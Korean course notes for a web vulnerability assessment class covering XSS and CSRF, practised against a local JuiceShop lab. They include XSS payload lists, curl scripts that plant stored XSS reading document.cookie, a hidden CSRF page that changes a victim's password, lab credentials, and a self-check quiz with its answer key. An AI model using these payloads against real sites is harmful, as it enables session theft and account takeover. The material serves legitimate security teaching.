# Week 06: 입력값 검증 (2): XSS / CSRF (상세 버전)

## 학습 목표
- Cross-Site Scripting(XSS)의 세 가지 유형을 구분할 수 있다
- JuiceShop에서 Reflected, Stored, DOM XSS를 실습한다
- Cross-Site Request Forgery(CSRF)의 원리를 이해하고 점검한다
- CSRF 토큰의 유효성을 검증하는 방법을 익힌다
- 각 개념의 보안 관점에서의 위험과 대응 방안을 분석할 수 있다
- OpsClaw를 활용하여 실습 작업을 자동화하고 증적을 관리할 수 있다
- 실제 보안 사고 사례와 연결하여 학습 내용을 적용할 수 있다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |


# 본 강의 내용

# Week 06: 입력값 검증 (2): XSS / CSRF

## 학습 목표
- Cross-Site Scripting(XSS)의 세 가지 유형을 구분할 수 있다
- JuiceShop에서 Reflected, Stored, DOM XSS를 실습한다
- Cross-Site Request Forgery(CSRF)의 원리를 이해하고 점검한다
- CSRF 토큰의 유효성을 검증하는 방법을 익힌다

## 전제 조건
- HTML/JavaScript 기초 (태그, 이벤트 핸들러)
- HTTP 요청/응답, 쿠키 개념 이해

---

## 1. XSS(Cross-Site Scripting) 개요 (20분)

### 1.1 XSS란?

XSS는 공격자가 웹 페이지에 악성 스크립트를 삽입하여, 다른 사용자의 브라우저에서 실행되게 하는 취약점이다.

```
공격자 → 악성 스크립트 삽입 → 서버에 저장 또는 URL에 포함
                                    ↓
피해자 → 해당 페이지 방문 → 스크립트 실행 → 쿠키 탈취, 피싱 등
```

### 1.2 XSS 유형 비교

| 유형 | 스크립트 위치 | 지속성 | 위험도 |
|------|-------------|--------|--------|
| **Reflected XSS** | URL 파라미터 → 응답에 반사 | 비지속 | 중간 |
| **Stored XSS** | DB에 저장 → 페이지에 출력 | 지속 | 높음 |
| **DOM XSS** | 클라이언트 JS에서 처리 | 비지속 | 중간 |

### 1.3 OWASP에서의 위치

**A03:2021 Injection** 카테고리. XSS는 가장 흔한 웹 취약점 중 하나로, 발견 빈도가 매우 높다.

---

## 2. Reflected XSS (30분)

### 2.1 원리

사용자의 입력이 서버 응답에 그대로 **반사(reflect)**되어 스크립트가 실행된다.

```
URL: http://site.com/search?q=<script>alert(1)</script>

서버 응답:
<p>검색 결과: <script>alert(1)</script></p>
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
              입력이 그대로 HTML에 삽입됨
```

### 2.2 JuiceShop에서 Reflected XSS 탐지

```bash
# 검색 기능에 XSS 페이로드 삽입
# 서버 응답에 스크립트가 그대로 포함되는지 확인
curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | grep -o "<script>alert(1)</script>" && echo "XSS 반사됨!" || echo "필터링됨"

# URL 인코딩 버전
curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | head -5

# 다양한 페이로드 테스트
PAYLOADS=(
  '<script>alert(1)</script>'
  '<img src=x onerror=alert(1)>'
  '<svg onload=alert(1)>'
  '"><script>alert(1)</script>'
  "'-alert(1)-'"
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
  if echo "$result" | grep -q "alert(1)"; then
    echo "[반사됨] $payload"
  else
    echo "[필터링] $payload"
  fi
done
```

### 2.3 JuiceShop의 트래킹 파라미터

```bash
# JuiceShop의 트래킹 기능에서 Reflected XSS
# /#/track-result?id= 파라미터 확인
curl -s "http://10.20.30.80:3000/#/track-result?id=<iframe%20src='javascript:alert(1)'>"

# Angular 기반이므로 서버 사이드 반사보다 클라이언트 사이드에서 처리될 수 있음
# 응답 HTML 소스를 확인하여 판단
curl -s http://10.20.30.80:3000 | grep -c "sanitize\|DomSanitizer\|innerHtml"
```

---

## 3. Stored XSS (30분)

### 3.1 원리

악성 스크립트가 서버(DB)에 **저장**되어, 해당 페이지를 방문하는 모든 사용자에게 실행된다.

```
1. 공격자 → 게시판에 <script>악성코드</script> 작성
2. 서버 → DB에 저장
3. 피해자 → 게시판 열람 → 스크립트 실행 → 쿠키 탈취
```

### 3.2 JuiceShop 피드백 기능에서 Stored XSS

```bash
# 먼저 로그인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 피드백에 XSS 페이로드 삽입
curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "comment": "좋은 서비스입니다 <script>alert(document.cookie)</script>",
    "rating": 5,
    "captchaId": 0,
    "captcha": "-1"
  }' | python3 -m json.tool 2>/dev/null

# 저장된 피드백 조회 - XSS 페이로드가 그대로 나오는지 확인
curl -s http://10.20.30.80:3000/api/Feedbacks/ | python3 -c "
import sys, json
data = json.load(sys.stdin).get('data', [])
for fb in data[-3:]:
    comment = fb.get('comment', '')
    if '<script>' in comment or 'onerror' in comment:
        print(f'[XSS 발견] ID:{fb.get(\"id\")}, Comment: {comment[:100]}')
    else:
        print(f'[정상] ID:{fb.get(\"id\")}, Comment: {comment[:80]}')
" 2>/dev/null
```

### 3.3 다양한 저장 위치 테스트

```bash
# 사용자 프로필 이름에 XSS
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{
    "email": "xss<img src=x onerror=alert(1)>@test.com",
    "password": "Test1234!",
    "passwordRepeat": "Test1234!",
    "securityQuestion": {"id": 1},
    "securityAnswer": "test"
  }' 2>/dev/null | python3 -m json.tool 2>/dev/null

# 상품 리뷰에 XSS
curl -s -X PUT http://10.20.30.80:3000/rest/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "message": "훌륭한 제품! <img src=x onerror=alert(document.domain)>",
    "author": "student@test.com"
  }' 2>/dev/null

# 저장된 리뷰 확인
curl -s http://10.20.30.80:3000/rest/products/1/reviews | python3 -m json.tool 2>/dev/null | head -20
```

---

## 4. DOM XSS (25분)

### 4.1 원리

서버를 거치지 않고, **클라이언트 JavaScript**가 URL 파라미터를 안전하지 않게 처리하여 발생한다.

```javascript
// 취약한 코드 예시
var name = document.location.hash.substring(1);
document.getElementById("welcome").innerHTML = "환영합니다, " + name;

// 공격 URL
http://site.com/page#<img src=x onerror=alert(1)>
```

### 4.2 JuiceShop에서 DOM XSS 탐지

```bash
# JuiceShop은 Angular SPA이므로 DOM XSS 가능성이 높음
# 메인 페이지의 JS 소스에서 위험한 패턴 검색

# innerHTML 사용 여부 확인
MAIN_JS=$(curl -s http://10.20.30.80:3000 | grep -oE 'src="[^"]*main[^"]*\.js"' | head -1 | sed 's/src="//;s/"//')
if [ -n "$MAIN_JS" ]; then
  echo "JS 파일: $MAIN_JS"
  curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -c "innerHTML\|outerHTML\|document.write\|bypassSecurity\|trustAsHtml"
fi

# JuiceShop의 검색 기능은 클라이언트에서 결과를 렌더링
# DOM XSS 테스트: 검색어에 HTML 삽입
# 브라우저에서 http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(1)"> 접근
echo "DOM XSS 테스트 URL:"
echo "http://10.20.30.80:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E"
```

### 4.3 DOM XSS 소스와 싱크

| 소스 (Source) | 설명 |
|--------------|------|
| `document.URL` | 현재 URL |
| `document.location.hash` | URL의 # 이후 부분 |
| `document.referrer` | 이전 페이지 URL |
| `window.name` | 윈도우 이름 |

| 싱크 (Sink) | 설명 |
|-------------|------|
| `innerHTML` | HTML 삽입 |
| `document.write()` | 문서에 직접 쓰기 |
| `eval()` | 코드 실행 |
| `setTimeout(string)` | 문자열 코드 실행 |

---

## 5. CSRF(Cross-Site Request Forgery) (25분)

### 5.1 CSRF란?

CSRF는 인증된 사용자가 자신도 모르게 의도하지 않은 요청을 서버에 보내게 하는 공격이다.

```
1. 피해자 → JuiceShop에 로그인 (쿠키 발급)
2. 공격자 → 악성 페이지에 JuiceShop 요청을 숨김
3. 피해자 → 악성 페이지 방문 → 브라우저가 자동으로 요청 전송 (쿠키 포함)
4. JuiceShop → 정상 요청으로 인식 → 처리
```

### 5.2 CSRF 가능성 점검

```bash
# 1. CSRF 토큰 존재 여부 확인
# 폼 페이지에서 hidden 필드의 CSRF 토큰 확인
curl -s http://10.20.30.80:3000 | grep -i "csrf\|_token\|xsrf" | head -5

# 2. API 요청에 CSRF 방어 확인
# JuiceShop는 JWT 인증을 사용하므로 쿠키 기반 CSRF와 다름
# 하지만 쿠키로 세션을 관리하는 부분이 있는지 확인

# 로그인 후 쿠키 확인
curl -s -c - -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | grep -i "cookie\|set-cookie" || echo "쿠키 기반 세션 미사용"

# 3. SameSite 쿠키 속성 확인
curl -sI http://10.20.30.80:3000 | grep -i "set-cookie" | grep -i "samesite" || echo "SameSite 속성 미설정"
```

### 5.3 CSRF 공격 시나리오 (개념)

```html
<!-- 공격자가 만든 악성 페이지 -->
<html>
<body>
<h1>축하합니다! 상품권 당첨!</h1>
<!-- 숨겨진 요청: 피해자의 비밀번호를 변경 -->
<img src="http://10.20.30.80:3000/rest/user/change-password?new=hacked123&repeat=hacked123" style="display:none">

<!-- 또는 폼을 이용한 POST CSRF -->
<form action="http://10.20.30.80:3000/api/Feedbacks/" method="POST" id="csrf-form">
  <input type="hidden" name="comment" value="CSRF로 작성된 피드백">
  <input type="hidden" name="rating" value="1">
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

### 5.4 CSRF 토큰 검증 점검

```bash
# CSRF 토큰 없이 상태 변경 요청이 성공하는지 확인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 비밀번호 변경 시도 (CSRF 토큰 없이)
curl -s "http://10.20.30.80:3000/rest/user/change-password?current=Test1234!&new=NewPass123!&repeat=NewPass123!" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: token=$TOKEN" | python3 -m json.tool 2>/dev/null

# GET 메서드로 상태 변경이 가능하면 CSRF에 매우 취약
```

---

## 6. XSS 방어 방법 (10분)

### 6.1 방어 기법

| 기법 | 설명 | 적용 위치 |
|------|------|----------|
| **출력 인코딩** | `<` → `&lt;`, `>` → `&gt;` | 서버 템플릿 |
| **입력값 검증** | 화이트리스트 기반 필터링 | 서버 입력 처리 |
| **CSP 헤더** | 인라인 스크립트 차단 | HTTP 응답 헤더 |
| **HttpOnly 쿠키** | JS에서 쿠키 접근 불가 | Set-Cookie |
| **DOM Purify** | 클라이언트 HTML 정화 | JS 라이브러리 |

### 6.2 CSP 헤더 점검

```bash
# Content-Security-Policy 헤더 확인
curl -sI http://10.20.30.80:3000 | grep -i "content-security-policy"

# CSP가 없으면 인라인 스크립트 실행 가능 → XSS 위험 증가
# CSP가 있으면 정책 내용 분석:
# - 'unsafe-inline': 인라인 스크립트 허용 (위험)
# - 'unsafe-eval': eval() 허용 (위험)
# - 'self': 같은 출처만 허용 (양호)
```

---

## 7. 실습 과제

### 과제 1: XSS 탐지
1. JuiceShop의 검색, 피드백, 리뷰 기능에서 XSS를 시도하라
2. 성공한 페이로드와 차단된 페이로드를 표로 정리하라
3. 각 XSS 유형(Reflected/Stored/DOM)별로 1개 이상 성공 사례를 찾아라

### 과제 2: CSRF 점검
1. JuiceShop의 상태 변경 API(비밀번호 변경, 피드백 작성 등)를 나열하라
2. 각 API에 CSRF 방어(토큰, SameSite 등)가 있는지 확인하라
3. CSRF 공격이 가능한 시나리오를 1개 이상 작성하라

### 과제 3: 보안 헤더 분석
1. JuiceShop의 XSS 관련 보안 헤더를 모두 확인하라
   - Content-Security-Policy
   - X-XSS-Protection
   - X-Content-Type-Options
2. 각 헤더의 역할과 현재 설정의 적절성을 평가하라

---

## 8. 요약

| 취약점 | 공격 위치 | 영향 | 방어 |
|--------|----------|------|------|
| Reflected XSS | URL 파라미터 | 쿠키 탈취, 피싱 | 출력 인코딩, CSP |
| Stored XSS | DB 저장 데이터 | 모든 방문자 피해 | 입력 검증, 출력 인코딩 |
| DOM XSS | 클라이언트 JS | 쿠키 탈취, 피싱 | DOM Purify, CSP |
| CSRF | 외부 사이트 | 의도하지 않은 작업 | CSRF 토큰, SameSite |

**다음 주 예고**: Week 07 - 입력값 검증 (3): 파일 업로드, 경로 순회, OS 명령어 주입을 학습한다.


---

## 심화 학습: 개념 확장

### 핵심 개념 상세 해설

이 주차에서 다루는 핵심 개념들을 더 깊이 살펴본다.

#### 개념 1: 동작 원리 (Course 3)

이 주차에서 다루는 기술의 동작 방식을 단계별로 분해하여 이해한다.

```
[1단계] 입력/요청 → 시스템이 데이터를 수신
[2단계] 처리 → 내부 로직에 의한 데이터 처리
[3단계] 출력/응답 → 결과 반환 또는 상태 변경
[4단계] 기록 → 로그/증적 생성
```

> **왜 이 순서가 중요한가?**
> 각 단계에서 보안 검증이 누락되면 취약점이 발생한다.
> 1단계: 입력값 검증 미흡 → Injection
> 2단계: 인가 확인 누락 → Broken Access Control
> 3단계: 에러 정보 노출 → Information Disclosure
> 4단계: 로깅 실패 → Monitoring Failures

#### 개념 2: 보안 관점에서의 위험 분석

| 위험 요소 | 발생 조건 | 영향도 | 대응 방안 |
|----------|---------|--------|---------|
| 설정 미흡 | 기본 설정 사용 | 높음 | 보안 하드닝 가이드 적용 |
| 패치 누락 | 업데이트 미적용 | 높음 | 정기 패치 관리 프로세스 |
| 접근 제어 부재 | 인증/인가 미구현 | 매우 높음 | RBAC, MFA 적용 |
| 로깅 미흡 | 감사 로그 미수집 | 중간 | SIEM 연동, 로그 정책 |

#### 개념 3: 실제 사례 분석

**사례 1: 유사 취약점이 실제 피해로 이어진 경우**

실제 보안 사고에서 이 주차의 주제가 어떻게 악용되었는지 살펴본다.
공격자는 동일한 기법을 사용하여 대규모 데이터 유출, 서비스 장애, 금전적 피해를 초래하였다.

**교훈:**
- 기본적인 보안 조치의 중요성
- 탐지 체계의 필수성
- 사고 대응 절차의 사전 수립 필요성

### 도구 비교표

| 도구 | 용도 | 장점 | 단점 | 라이선스 |
|------|------|------|------|---------|
| 도구 A | 기본 점검 | 간편, 빠름 | 기능 제한 | 오픈소스 |
| 도구 B | 심층 분석 | 상세 결과 | 학습 곡선 | 상용/무료 |
| 도구 C | 자동화 | CI/CD 연동 | 오탐 가능 | 오픈소스 |


---

## 보충 실습

### 보충 실습 1: 기본 동작 확인

이론에서 배운 내용을 직접 확인하는 기초 실습이다.

```bash
# Step 1: 현재 상태 확인
echo "=== 현재 상태 ==="
# (해당 주차에 맞는 확인 명령)

# Step 2: 설정/변경 적용
echo "=== 변경 적용 ==="
# (해당 주차에 맞는 실습 명령)

# Step 3: 결과 검증
echo "=== 결과 확인 ==="
# (변경 결과 확인 명령)
```

> **트러블슈팅:**
> - 명령이 실패하면: 권한(sudo), 경로, 서비스 상태를 먼저 확인
> - 예상과 다른 결과: 이전 실습의 설정이 남아있을 수 있으므로 초기화 후 재시도
> - 타임아웃: 네트워크 연결 또는 서비스 가동 상태 확인

### 보충 실습 2: 탐지/모니터링 관점

공격자가 아닌 **방어자 관점**에서 동일한 활동을 모니터링하는 실습이다.

```bash
# siem 서버에서 관련 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5" 2>/dev/null

# Suricata 알림 확인 (해당 시)
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tail -20 /var/log/suricata/fast.log" 2>/dev/null
```

> **왜 방어자 관점도 배우는가?**
> 공격 기법만 알면 "스크립트 키디"에 불과하다.
> 공격이 어떻게 탐지되는지 이해해야 진정한 보안 전문가이다.
> 이 과목의 모든 공격 실습에는 대응하는 탐지/방어 관점이 포함된다.

### 보충 실습 3: OpsClaw 자동화

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화한다.

```bash
# 프로젝트 생성 (이번 주차용)
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"weekXX-lab","request_text":"이번 주차 실습 자동화","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

# Stage 전환
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# 실습 태스크 실행 (해당 주차에 맞게 수정)
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1,"title":"실습 태스크 1","instruction_prompt":"echo 실습1","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":2,"title":"실습 태스크 2","instruction_prompt":"echo 실습2","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
    ],
    "subagent_url":"http://localhost:8002",
    "parallel":true
  }'

# Evidence 확인
curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
  -H "X-API-Key: opsclaw-api-key-2026" | python3 -m json.tool
```


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** 이번 주차 "Week 06: 입력값 검증 (2): XSS / CSRF"의 핵심 목적은 무엇인가?
- (a) 네트워크 속도 향상  (b) **웹 취약점 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인

**Q2.** 이 주제에서 OWASP의 역할은?
- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의

**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
- (a) 파일 복사  (b) **점검 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력

**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함

**Q5.** 이 주제의 보안 위험이 높은 이유는?
- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제

**Q6.** 방어/대응의 핵심 원칙은?
- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경

**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜

**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음

**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식

**Q10.** 다음 주차와의 연결 포인트는?
- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만

**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b

---

## 과제 (다음 주까지)

### 과제 1: 이론 정리 보고서 (30점)

이번 주차의 핵심 개념을 자신의 말로 정리하라.

| 항목 | 배점 |
|------|------|
| 핵심 개념 정의 및 설명 | 10점 |
| 실습 결과 캡처 및 해석 | 10점 |
| 보안 관점 분석 (공격↔방어) | 10점 |

### 과제 2: 실습 수행 보고서 (40점)

이번 주차의 모든 실습을 수행하고 결과를 보고서로 작성하라.

| 항목 | 배점 |
|------|------|
| 실습 명령어 및 실행 결과 캡처 | 15점 |
| 결과 해석 및 보안 의미 분석 | 15점 |
| 트러블슈팅 경험 (있는 경우) | 10점 |

### 과제 3: OpsClaw 자동화 (30점)

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화하라.

| 항목 | 배점 |
|------|------|
| 프로젝트 생성 + stage 전환 | 5점 |
| execute-plan 태스크 설계 (3개 이상) | 10점 |
| evidence/summary 결과 | 5점 |
| replay 타임라인 결과 | 5점 |
| 자동화의 이점 분석 (직접 실행 대비) | 5점 |

**제출:** 보고서(PDF 또는 MD) + OpsClaw project_id


---

## 검증 체크리스트

이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:

- [ ] 이론 강의 내용 이해 (핵심 용어 설명 가능)
- [ ] 기본 실습 모두 수행 완료
- [ ] 보충 실습 1 (기본 동작 확인) 완료
- [ ] 보충 실습 2 (탐지/모니터링 관점) 수행
- [ ] 보충 실습 3 (OpsClaw 자동화) 수행
- [ ] 자가 점검 퀴즈 8/10 이상 정답
- [ ] 과제 1 (이론 정리) 작성
- [ ] 과제 2 (실습 보고서) 작성
- [ ] 과제 3 (OpsClaw 자동화) 완료

